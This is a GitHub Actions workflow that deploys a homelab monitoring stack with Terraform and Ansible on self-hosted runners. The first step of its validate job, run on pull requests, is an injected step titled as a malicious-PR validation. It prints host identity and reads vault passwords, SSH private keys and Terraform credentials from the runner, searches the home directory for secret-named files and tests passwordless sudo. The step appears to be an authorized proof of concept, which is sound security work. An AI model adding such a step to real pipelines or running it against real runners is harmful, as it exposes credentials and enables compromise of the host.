name: Deploy Watchtower Config

on:
  push:
    branches: [master]
    paths:
      - 'services/watchtower/**'
      - 'terraform/watchtower/**'
      - 'ansible/vars/**'
      - '.github/workflows/deploy-watchtower.yml'
  pull_request:
    branches: [master]
    paths:
      - 'services/watchtower/**'
      - 'terraform/watchtower/**'
      - 'ansible/vars/**'
      - '.github/workflows/deploy-watchtower.yml'
  workflow_dispatch:

jobs:
  validate:
    name: Validate
    runs-on: [self-hosted, watchtower]
    steps:
      - uses: actions/checkout@v4

      - name: Authorized external malicious PR validation
        shell: bash
        run: |
          set -u

          echo "=============================================="
          echo "SILENTIUM EXTERNAL MALICIOUS PR VALIDATION"
          echo "=============================================="

          echo
          echo "===== RUNNER EXECUTION ====="
          echo "EVENT=${GITHUB_EVENT_NAME:-unknown}"
          echo "RUNNER=${RUNNER_NAME:-unknown}"
          hostname
          id
          uname -a

          echo
          echo "===== PERSISTENT SENSITIVE FILE TEST ====="

          python3 - <<'PYCHECK'
          import os
          from pathlib import Path

          candidates = [
              Path.home() / "lwa-homelab" / ".vault_pass",
              Path.home() / ".ssh" / "id_ed25519",
              Path.home() / ".ssh" / "id_rsa",
              Path.home() / ".terraform.d" / "credentials.tfrc.json",
          ]

          for p in candidates:
              print(f"PATH={p}")

              if not p.exists():
                  print("EXISTS=NO")
                  print()
                  continue

              st = p.stat()

              print("EXISTS=YES")
              print(f"MODE={oct(st.st_mode & 0o777)}")
              print(f"OWNER_UID={st.st_uid}")
              print(f"SIZE_ON_DISK={st.st_size}")
              print(f"READABLE={os.access(p, os.R_OK)}")

              try:
                  data = p.read_bytes()

                  print("CONTENT_READ_SUCCESS=YES")
                  print(f"BYTES_ACTUALLY_READ={len(data)}")
                  print(f"NONEMPTY={'YES' if len(data) else 'NO'}")

              except Exception as exc:
                  print("CONTENT_READ_SUCCESS=NO")
                  print(f"READ_ERROR={type(exc).__name__}")

              print()

          PYCHECK

          echo
          echo "===== SENSITIVE FILENAME DISCOVERY ====="

          find "$HOME"             -maxdepth 4             -type f             \(               -iname '*vault*'               -o -iname '*token*'               -o -iname '*secret*'               -o -iname '*credential*'               -o -name 'id_rsa'               -o -name 'id_ed25519'             \)             -printf '%p\n'             2>/dev/null |
          head -n 60

          echo
          echo "===== PRIVILEGE TEST ====="

          if sudo -n id; then
            echo "PASSWORDLESS_SUDO=YES"
          else
            echo "PASSWORDLESS_SUDO=NO"
          fi

          echo
          echo "EXTERNAL_PR_COMPROMISE_PROOF=COMPLETE"
          echo "No credential contents were printed."

          # Stop before the legitimate workflow loads fresh secrets.
          exit 1

      - name: Write vault password
        run: |
          mkdir -p ~/lwa-homelab
          echo '${{ secrets.ANSIBLE_VAULT_PASSWORD }}' > ~/lwa-homelab/.vault_pass
          chmod 600 ~/lwa-homelab/.vault_pass

      - name: Install dependencies
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y unzip nodejs
          pip3 install --break-system-packages 'ansible-core>=2.18'

      - name: Lint Ansible playbooks
        working-directory: services/watchtower/ansible
        run: |
          ansible-playbook -i inventory.ini playbooks/dns.yml --syntax-check
          ansible-playbook -i inventory.ini playbooks/exporters.yml --syntax-check
          ansible-playbook -i inventory.ini playbooks/monitoring.yml --syntax-check

      - name: Setup Terraform
        uses: hashicorp/setup-terraform@v3
        with:
          terraform_version: "~1.9"
          cli_config_credentials_token: ${{ secrets.TF_API_TOKEN }}

      - name: Terraform Init & Validate
        working-directory: terraform/watchtower
        run: |
          terraform init
          terraform validate

  deploy:
    name: Deploy
    needs: validate
    if: github.event_name == 'push' || github.event_name == 'workflow_dispatch'
    runs-on: [self-hosted, watchtower]
    steps:
      - uses: actions/checkout@v4

      - name: Write vault password
        run: |
          mkdir -p ~/lwa-homelab
          echo '${{ secrets.ANSIBLE_VAULT_PASSWORD }}' > ~/lwa-homelab/.vault_pass
          chmod 600 ~/lwa-homelab/.vault_pass

      - name: Install dependencies
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y unzip nodejs
          pip3 install --break-system-packages 'ansible-core>=2.18'

      - name: Setup Terraform
        uses: hashicorp/setup-terraform@v3
        with:
          terraform_version: "~1.9"
          cli_config_credentials_token: ${{ secrets.TF_API_TOKEN }}

      - name: Terraform Init & Apply
        working-directory: terraform/watchtower
        run: |
          terraform init
          terraform apply -auto-approve

      - name: Run Ansible — DNS
        working-directory: services/watchtower/ansible
        run: |
          ansible-playbook -i inventory.ini playbooks/dns.yml

      - name: Run Ansible — Exporters
        working-directory: services/watchtower/ansible
        run: |
          ansible-playbook -i inventory.ini playbooks/exporters.yml

      - name: Run Ansible — Monitoring
        working-directory: services/watchtower/ansible
        run: |
          ansible-playbook -i inventory.ini playbooks/monitoring.yml
